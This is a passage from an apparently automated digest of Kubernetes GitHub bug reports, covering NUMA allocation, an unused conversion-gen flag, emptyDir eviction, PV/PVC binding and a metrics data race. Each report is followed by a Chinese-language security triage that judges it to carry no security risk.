Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633391 2326 policy_static.go:303] "Static policy: Allocate" pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633407 2326 policy_static.go:352] "Topology Affinity" pod="default/kube-mgrr-2" containerName="kube-mgrr-2" affinity={"NUMANodeAffinity":1,"Preferred":true}
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633421 2326 policy_static.go:392] "AllocateCPUs" numCPUs=1 socket="01"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633496 2326 state_mem.go:88] "Updated default CPUSet" cpuSet="0,3-7"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.635778 2326 policy_static.go:424] "AllocateCPUs" result="2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.635830 2326 state_mem.go:80] "Updated desired CPUSet" podUID="2e769357-b700-49fa-96dc-2416a0379cb9" containerName="kube-mgrr-2" cpuSet="2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.638325 2326 policy_static.go:106] "Allocate" pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.638367 2326 policy_static.go:123] "Got topology affinity" pod="default/kube-mgrr-2" podUID="2e769357-b700-49fa-96dc-2416a0379cb9" containerName="kube-mgrr-2" hint={"NUMANodeAffinity":1,"Preferred":true}
Nov 08 19:34:55 minikube kubelet[2326]: E1108 19:34:55.638418 2326 memory_manager.go:257] "Allocate error" err="[memorymanager] failed to find NUMA nodes to extend the current topology hint"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.638450 2326 kubelet.go:2306] "Pod admission denied" podUID="2e769357-b700-49fa-96dc-2416a0379cb9" pod="default/kube-mgrr-2" reason="UnexpectedAdmissionError" message="Allocate failed due to [memorymanager] failed to find NUMA nodes to extend the current topology hint, which is unexpected"


I modified the second pod to request '200m' worth of CPU rather than a whole CPU, and the pod started up as expected.


#### What did you expect to happen?

The pod should have started up with one exclusive CPU and memory from both NUMA nodes.

#### How can we reproduce it (as minimally and precisely as possible)?

Set the memory manager policy to "Static" and topology manager policy to "restricted". On a two-NUMA-node worker node create a smallish Pod with a single exclusive CPU (request/limit both 1 cpu) that easily fits on one NUMA node worth of memory. Create a second Pod in the Guaranteed QoS class with a big enough memory request that it cannot fit on one NUMA node, with cpu request/limit both set to 1 cpu. 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
cfriesen@debian:~$ minikube kubectl -- version
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.31.2

```

</details>


#### Cloud provider

<details>
n/a
</details>


#### OS version

<details>

```console
# On Linux:
cfriesen@debian:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

$ uname -a
cfriesen@debian:~$ uname -a
Linux debian 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux


```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了在 Kubernetes 中使用 NUMA 感知的内存管理器和拓扑管理器策略为 "restricted" 时，遇到了 UnexpectedAdmissionError。具体来说，用户尝试创建一个请求 1 个 CPU 和 9Gi 内存的 Pod，以强制其从两个 NUMA 节点分配内存，但出现了错误。

从 kubelet 日志中可以看出，内存管理器无法找到适当的 NUMA 节点来满足当前的拓扑提示，导致了分配失败。这是 Kubernetes 在特定资源请求和配置下的资源调度问题。

根据提供的信息，此问题是一个功能性错误，涉及到资源调度和分配策略的实现，并未涉及任何安全漏洞。没有迹象表明攻击者可以利用此错误进行攻击，也没有涉及敏感信息泄露或高风险的安全问题。因此，根据风险判断标准，此 Issue 不涉及安全风险。

---

## Issue #128693 The extra-dirs flag present in conversion-gen but not wired

- Issue 链接：[#128693](https://github.com/kubernetes/kubernetes/issues/128693)

### Issue 内容

#### What happened?

The `extra-dirs` flag option is present in conversion-gen cmd but it is not wired in the code. Any inputs from `extra-dirs` are entirely unused and this can lead to confusion when those dirs are not considered during conversion-gen. It seems the `extra-dirs` is deprecated but the `extra-dirs` flag is the leftover that should be removed eventually.

#### What did you expect to happen?

The `extra-dirs` flag shouldn't be an option in conversion-gen anymore. The conversion-gen cmd should err out if `extra-dirs` flag is included.

#### How can we reproduce it (as minimally and precisely as possible)?

Use `conversion-gen` with `extra-dirs` flag and those inputs are not used but there is no error reported.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
1.31

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>
NA
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue指出`conversion-gen`命令中存在一个`--extra-dirs`的标志参数，但在代码中并未实际使用该参数。因此，当用户使用`--extra-dirs`提供输入时，这些输入将被忽略，可能导致用户困惑。根据风险判断标准，该问题不涉及安全风险：

1. **该风险能被攻击者利用**：这个问题不会被攻击者利用，因为未使用的参数不会引入新的攻击面。

2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：该问题不符合CVE漏洞的定义，不会对系统的保密性、完整性或可用性造成影响。

3. **Issue不涉及安全问题，则风险评级判断为不涉及**：此Issue属于功能性问题或代码清理，不涉及安全性。

因此，该Issue不涉及安全风险。

---

## Issue #128604 Container using in Memory emptyDir was Evicted on DiskPressure

- Issue 链接：[#128604](https://github.com/kubernetes/kubernetes/issues/128604)

### Issue 内容

#### What happened?

This is my Pod/Container definition:

```
apiVersion: v1
kind: Pod
metadata:
  annotations:
    prometheus.io/path: /metrics
    prometheus.io/port: "1024"
    prometheus.io/scrape: "true"
  labels:
    app: ingress-haproxy-internal
    app.kubernetes.io/instance: ingress-haproxy-internal
    app.kubernetes.io/name: kubernetes-ingress
    controller-revision-hash: 7b74744854
    pod-template-generation: "5"
  name: ingress-haproxy-internal-kubernetes-ingress-fbdc9
  namespace: ingress-haproxy
spec:
  containers:
  - args:
    - --default-ssl-certificate=ingress-haproxy/ingress-haproxy-internal-kubernetes-ingress-default-cert
    - --configmap=ingress-haproxy/ingress-haproxy-internal-kubernetes-ingress
    - --http-bind-port=8080
    - --https-bind-port=8443
    - --ingress.class=haproxy-int
    - --publish-service=ingress-haproxy/ingress-haproxy-internal-kubernetes-ingress
    - --log=info
    - --prometheus
    env:
    - name: POD_NAME
      valueFrom:
        fieldRef:
          apiVersion: v1
          fieldPath: metadata.name
    - name: POD_NAMESPACE
      valueFrom:
        fieldRef:
          apiVersion: v1
          fieldPath: metadata.namespace
    - name: POD_IP
      valueFrom:
        fieldRef:
          apiVersion: v1
          fieldPath: status.podIP
    image: hub.willhaben.at:8448/haproxytech/kubernetes-ingress:3.0.4
    imagePullPolicy: IfNotPresent
    livenessProbe:
      failureThreshold: 3
      httpGet:
        path: /healthz
        port: 1042
        scheme: HTTP
      periodSeconds: 5
      successThreshold: 1
      timeoutSeconds: 1
    name: kubernetes-ingress-controller
    ports:
    - containerPort: 8080
      name: http
      protocol: TCP
    - containerPort: 8443
      name: https
      protocol: TCP
    - containerPort: 1024
      name: stat
      protocol: TCP
    readinessProbe:
      failureThreshold: 3
      httpGet:
        path: /healthz
        port: 1042
        scheme: HTTP
      periodSeconds: 5
      successThreshold: 1
      timeoutSeconds: 1
    resources:
      requests:
        cpu: 100m
        memory: 512Mi
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        add:
        - NET_BIND_SERVICE
        drop:
        - ALL
      runAsGroup: 1000
      runAsNonRoot: true
      runAsUser: 1000
      seccompProfile:
        type: RuntimeDefault
    startupProbe:
      failureThreshold: 20
      httpGet:
        path: /healthz
        port: 1042
        scheme: HTTP
      periodSeconds: 1
      successThreshold: 1
      timeoutSeconds: 1
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /tmp
      name: tmp
      subPath: tmp
    - mountPath: /run
      name: tmp
      subPath: run
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-fffsq
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: ip-10-11-24-31.eu-central-1.compute.internal
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext:
    runAsGroup: 1000
    runAsNonRoot: true
    runAsUser: 1000
  serviceAccount: ingress-haproxy-internal-kubernetes-ingress
  serviceAccountName: ingress-haproxy-internal-kubernetes-ingress
  terminationGracePeriodSeconds: 60
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
  - effect: NoSchedule
    key: node.kubernetes.io/disk-pressure
    operator: Exists
  - effect: NoSchedule
    key: node.kubernetes.io/memory-pressure
    operator: Exists
  - effect: NoSchedule
    key: node.kubernetes.io/pid-pressure
    operator: Exists
  - effect: NoSchedule
    key: node.kubernetes.io/unschedulable
    operator: Exists
  volumes:
  - emptyDir:
      medium: Memory
      sizeLimit: 64Mi
    name: tmp
  - name: kube-api-access-fffsq
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
```

and among all other pods it got evicted as first on DiskPressure with the following message:

```
The node was low on resource: ephemeral-storage. Threshold quantity: 2139512454, available: 1732380Ki. Container kubernetes-ingress-controller was using 27984Ki, request is 0, has larger consumption of ephemeral-storage. 
```

#### What did you expect to happen?

The `27984Ki` should count as memory usage and not ephemeral storage usage, therefore my pod should not Evicted because it's using more ephemeral-storage than the request 

#### How can we reproduce it (as minimally and precisely as possible)?

1. Run a Pod with in Memory emptyDir volume
2. Write something in the volume
3. Check the node /stats/summary 
4. The container should not report any ephemral storage usage

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.31.0-eks-a737599
```

</details>


#### Cloud provider

<details>
EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Amazon Linux"
VERSION="2023"
ID="amzn"
ID_LIKE="fedora"
VERSION_ID="2023"
PLATFORM_ID="platform:al2023"
PRETTY_NAME="Amazon Linux 2023.5.20240916"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2023"
HOME_URL="https://aws.amazon.com/linux/amazon-linux-2023/"
DOCUMENTATION_URL="https://docs.aws.amazon.com/linux/"
SUPPORT_URL="https://aws.amazon.com/premiumsupport/"
BUG_REPORT_URL="https://github.com/amazonlinux/amazon-linux-2023"
VENDOR_NAME="AWS"
VENDOR_URL="https://aws.amazon.com/"
SUPPORT_END="2028-03-15"
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue报告了在使用`emptyDir`卷（设置为`medium: Memory`）的情况下，容器仍然因为磁盘压力（DiskPressure）而被驱逐的问题。这个问题涉及Kubernetes在资源管理上的行为，与容器资源统计和调度策略相关，但并不涉及任何安全风险。根据风险判断标准第6条：如果Issue不涉及安全问题，则风险评级判断为不涉及。因此，该Issue不涉及安全风险。

---

## Issue #128594 kubectl get cs only show one etcd

- Issue 链接：[#128594](https://github.com/kubernetes/kubernetes/issues/128594)

### Issue 内容

#### What happened?


```shell
kubectl get cs
Warning: v1 ComponentStatus is deprecated in v1.19+
NAME                 STATUS    MESSAGE   ERROR
controller-manager   Healthy   ok
scheduler            Healthy   ok
etcd-0               Healthy   ok
```


#### What did you expect to happen?

show three etcd

```shell
kubectl get cs
Warning: v1 ComponentStatus is deprecated in v1.19+
NAME                 STATUS    MESSAGE   ERROR
etcd-0               Healthy   ok
scheduler            Healthy   ok
controller-manager   Healthy   ok
etcd-2               Healthy   ok
etcd-1               Healthy   ok
```

#### How can we reproduce it (as minimally and precisely as possible)?

k8s version 1.28.12 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.28.15
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.15
```

</details>


#### Cloud provider

<details>
none
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在使用`kubectl get cs`命令时，只显示了一个etcd实例，而预期应该显示三个etcd实例。同时，命令输出中提示`v1 ComponentStatus is deprecated in v1.19+`，说明`kubectl get cs`命令在Kubernetes 1.19及以上版本中已被弃用，可能无法正确显示组件状态。这是由于使用了已弃用的命令导致的显示问题，属于功能性问题，不涉及安全风险。根据风险判断标准第6条，如果Issue不涉及安全问题，则风险评级判断为不涉及。

---

## Issue #128568 pv is bound to pvc, but pvc is pending

- Issue 链接：[#128568](https://github.com/kubernetes/kubernetes/issues/128568)

### Issue 内容

#### What happened?

I have a pvc1: `tmp-pvc-1d9c5916-c994-42e5-8060-99d563b43e3a`,  and bound to pv: `pvc-a4ec28db-8fed-4067-8a19-ba0ff65b4996`. I changed the claimRef of pv:`pvc-a4ec28db-8fed-4067-8a19-ba0ff65b4996` to pvc2:`f55bp1pq6y`, pv status is bound and bound to pvc2:`f55bp1pq6y`. But pvc2:`f55bp1pq6y` status is still pending, and pvc1:`tmp-pvc-1d9c5916-c994-42e5-8060-99d563b43e3a` status is lost.
```
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  annotations:
    cdi.kubevirt.io/clonePhase: Pending
    cdi.kubevirt.io/cloneType: csi-clone
    cdi.kubevirt.io/createdForDataVolume: 417bdae0-3eb3-4be1-a438-fcf972d7a0ff
    cdi.kubevirt.io/dataSourceNamespace: default
    cdi.kubevirt.io/storage.clone.token: eyJhbGciOiJQUzI1NiJ9.eyJleHAiOjE3MzA4MDQwOTksImlhdCI6MTczMDgwMzc5OSwiaXNzIjoiY2RpLWFwaXNlcnZlciIsIm5hbWUiOiJpbWctZjlqc242ZXMtY2VwaC1ibG9jayIsIm5hbWVzcGFjZSI6ImRlZmF1bHQiLCJuYmYiOjE3MzA4MDM3OTksIm9wZXJhdGlvbiI6IkNsb25lIiwicGFyYW1zIjp7InRhcmdldE5hbWUiOiJ2NzFnYmF1bXkzIiwidGFyZ2V0TmFtZXNwYWNlIjoid3l3LXRlc3QtZHYifSwicmVzb3VyY2UiOnsiZ3JvdXAiOiIiLCJyZXNvdXJjZSI6InBlcnNpc3RlbnR2b2x1bWVjbGFpbXMiLCJ2ZXJzaW9uIjoidjEifX0.SUaSFke9zXFcNDVLD1eM_3RrdbYl1qkmXROeshIbaP_ltrklDouOalJk7sROjGjTKDsUhdKqPfvjnNauM1JWxR1fGjzTuPi-GJVK8W9l8U9N6BTyze9swf4lsZMp0pY1GhFuqbPubfSvvUxvmQkg4Tc2GPGqCUYcm22w3N2zl5xBzGRi4Ugsr4vWdttu-ajTSlAb966LOL598AI5XUIDdOdL6wiu9QtHfR39amvRgxWpl_powtQlC1w8Jj0xta1I3BcGypi_KHhK6L36W7nJk6ko_-E0nxpNSy1bHzK_N8no0a3jYQJ1Sl0320aeeLvFwMB6BwIcCFttkLHjZ2opWA
    cdi.kubevirt.io/storage.condition.running: "false"
    cdi.kubevirt.io/storage.condition.running.message: Clone Pending
    cdi.kubevirt.io/storage.condition.running.reason: Pending
    cdi.kubevirt.io/storage.contentType: kubevirt
    cdi.kubevirt.io/storage.pod.restarts: "0"
    cdi.kubevirt.io/storage.populator.kind: VolumeCloneSource
    cdi.kubevirt.io/storage.preallocation.requested: "false"
    cdi.kubevirt.io/storage.usePopulator: "true"
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"cdi.kubevirt.io/v1beta1","kind":"DataVolume","metadata":{"annotations":{},"name":"v71gbaumy3","namespace":"wyw-test-dv"},"spec":{"pvc":{"accessModes":["ReadWriteOnce"],"resources":{"requests":{"storage":"50Gi"}},"storageClassName":"ceph-block","volumeMode":"Block"},"source":{"pvc":{"name":"img-f9jsn6es-ceph-block","namespace":"default"}}}}
    pv.kubernetes.io/bind-completed: "yes"
    pv.kubernetes.io/bound-by-controller: "yes"
    volume.beta.kubernetes.io/storage-provisioner: rook-ceph.rbd.csi.ceph.com
    volume.kubernetes.io/storage-provisioner: rook-ceph.rbd.csi.ceph.com
  creationTimestamp: "2024-11-05T10:50:07Z"
  finalizers:
  - kubernetes.io/pvc-protection
  labels:
    app: containerized-data-importer
    app.kubernetes.io/component: storage
    app.kubernetes.io/managed-by: cdi-controller
    cdi.kubevirt.io/OwnedByUID: e80fc9be-821f-452a-9b03-bb5bbadb5094
  name: tmp-pvc-1d9c5916-c994-42e5-8060-99d563b43e3a
  namespace: default
  resourceVersion: "10612580"
  uid: 11ee3bfa-a558-4464-9466-dc6d6fb6047c
spec:
  accessModes:
  - ReadWriteOnce
  dataSource:
    apiGroup: null
    kind: PersistentVolumeClaim
    name: img-f9jsn6es-ceph-block
  dataSourceRef:
    apiGroup: null
    kind: PersistentVolumeClaim
    name: img-f9jsn6es-ceph-block
  resources:
    requests:
      storage: 50Gi
  storageClassName: ceph-block
  volumeMode: Block
  volumeName: pvc-a4ec28db-8fed-4067-8a19-ba0ff65b4996
status:
  accessModes:
  - ReadWriteOnce
  capacity:
    storage: 50Gi
  phase: Bound
```
after updating pv claimRef to pvc2:`f55bp1pq6y`:
```
# kubectl get pvc | grep -i lost
tmp-pvc-1d9c5916-c994-42e5-8060-99d563b43e3a   Lost      pvc-a4ec28db-8fed-4067-8a19-ba0ff65b4996   0                         ceph-block     153m

[root@rongqi-node01 batch-create]# kubectl get pv pvc-a4ec28db-8fed-4067-8a19-ba0ff65b4996 
NAME                                       CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                    STORAGECLASS   REASON   AGE
pvc-a4ec28db-8fed-4067-8a19-ba0ff65b4996   40Gi       RWO            Retain           Bound    wyw-test-dv/f55bp1pq6y   ceph-block              158m
```

#### What did you expect to happen?

after updating pv claimRef to pvc2:`f55bp1pq6y`, pvc2:`f55bp1pq6y` status is bound.

#### How can we reproduce it (as minimally and precisely as possible)?

I encountered this problem when using the cdi project:
[https://github.com/kubevirt/containerized-data-importer/issues/3470](url)

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
WARNING: This version information is deprecated and will be replaced with the output from kubectl version --short.  Use --output=yaml|json to get the full version.
Client Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.6", GitCommit:"741c8db18a52787d734cbe4795f0b4ad860906d6", GitTreeState:"clean", BuildDate:"2023-09-13T09:21:34Z", GoVersion:"go1.20.8", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v5.0.1
Server Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.6", GitCommit:"741c8db18a52787d734cbe4795f0b4ad860906d6", GitTreeState:"clean", BuildDate:"2023-09-13T09:14:09Z", GoVersion:"go1.20.8", Compiler:"gc", Platform:"linux/amd64"}

```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# centos 8
$ uname -a
5.10.0-136.12.0.86.4.hl202.x86_64



```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
# kubectl exec -it -n rook-ceph rook-ceph-tools-5877f9f669-n8nfb -- ceph --version
ceph version 18.2.1 (7fe91d5d5842e04be3b4f514d6dd990c54b29c76) reef (stable)
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在修改PV的claimRef指向另一个PVC后，PVC的状态未正确更新的问题。这涉及到Kubernetes中PV和PVC之间绑定状态的不一致，可能导致资源使用上的混乱。

从安全角度分析：

1. **权限要求**：手动修改PV的claimRef需要对PV资源具有编辑权限，这通常是cluster-admin或具有高权限的用户才能执行的操作。普通用户无法随意修改PV的绑定关系。

2. **数据访问**：即使修改了PV的claimRef，如果攻击者能够将PV绑定到自己的PVC上，可能会尝试访问到不属于自己的持久化数据。但由于修改PV需要高权限，而拥有此权限的用户本身就有权限访问这些数据，因此不存在权限提升的问题。

3. **风险评估**：根据风险判断标准，第4条，如果攻击者需要一定权限才能实施攻击（如需要创建、修改等非只读权限），则不应判断为高风险，CVSS评级在high以下。

4. **敏感信息**：Issue中包含了JWT令牌等敏感信息，但根据第3条，issue提交者在提交内容中暴露的敏感信息属于提交者的问题，不属于项目的安全风险。

综上所述，该Issue不涉及安全风险。

---

## Issue #128549 No older versions of k8s.io/cri-client available in CRI client repo

- Issue 链接：[#128549](https://github.com/kubernetes/kubernetes/issues/128549)

### Issue 内容

#### What happened?

The repo https://github.com/kubernetes/cri-client only has v0.31 versions available. Older versions are no longer accessible. E.g. https://github.com/kubernetes/cri-client/tree/v0.29.9 directs to a 404 page, but https://github.com/kubernetes/cri-client/tree/v0.31.0 shows the repo at tag v0.31.0

#### What did you expect to happen?

Older versions should be available in the repo

#### How can we reproduce it (as minimally and precisely as possible)?

Go to https://github.com/kubernetes/cri-client/tree/v0.29.9, and Github shows a 404 page.

No tags are available for v0.30 and older when searching for such tags in the repo

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，该Issue反映了cri-client仓库中缺少旧版本标签的问题，导致无法访问旧版本的代码。这属于版本管理和仓库维护的问题，并不涉及任何安全风险。没有潜在的漏洞可以被攻击者利用，也没有敏感信息泄露或高风险的漏洞存在。因此，**风险评级判断为不涉及**。

---

## Issue #128548 Counter.WithContext: data race

- Issue 链接：[#128548](https://github.com/kubernetes/kubernetes/issues/128548)

### Issue 内容

#### What happened?

I ran integration tests with race detection enabled (https://github.com/kubernetes/kubernetes/pull/116980).

k8s.io/kubernetes/test/integration/storageversionmigrator failed with a data race (https://prow.k8s.io/view/gs/kubernetes-ci-logs/pr-logs/pull/116980/pull-kubernetes-integration/1853468672903876608):

```
Write at 0x00c000514d20 by goroutine 326096:
  k8s.io/component-base/metrics.(*Counter).WithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/component-base/metrics/counter.go:110 +0xb5e
  k8s.io/apiserver/pkg/audit.ObserveEvent()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/audit/metrics.go:89 +0xb40
  k8s.io/apiserver/pkg/endpoints/filters.processAuditEvent()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/audit.go:197 +0xb3f
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithAudit.func6.1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/audit.go:113 +0x6fe
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:605 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:84 +0x23c
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func27.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:605 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/endpoints/filters.withAuthentication.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/authentication.go:123 +0xd01
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:94 +0x4b5
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithWarningRecorder.func11()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/warning.go:35 +0x11d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/timeout.go:115 +0xd3

Previous write at 0x00c000514d20 by goroutine 326108:
  k8s.io/component-base/metrics.(*Counter).WithContext()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/component-base/metrics/counter.go:110 +0xb5e
  k8s.io/apiserver/pkg/audit.ObserveEvent()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/audit/metrics.go:89 +0xb40
  k8s.io/apiserver/pkg/endpoints/filters.processAuditEvent()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/audit.go:197 +0xb3f
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithAudit.func6.1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/audit.go:113 +0x6fe
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:605 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:84 +0x23c
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func27.deferwrap1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:103 +0x6f
  runtime.deferreturn()
      /usr/local/go/src/runtime/panic.go:605 +0x5d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/endpoints/filters.withAuthentication.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/authentication.go:123 +0xd01
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filterlatency/filterlatency.go:94 +0x4b5
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithWarningRecorder.func11()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/endpoints/filters/warning.go:35 +0x11d
  net/http.HandlerFunc.ServeHTTP()
      /usr/local/go/src/net/http/server.go:2220 +0x47
  k8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP.func1()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/filters/timeout.go:115 +0xd3
```


#### What did you expect to happen?

No race.

#### How can we reproduce it (as minimally and precisely as possible)?

Run the integration test with `go test -race`.

#### Anything else we need to know?

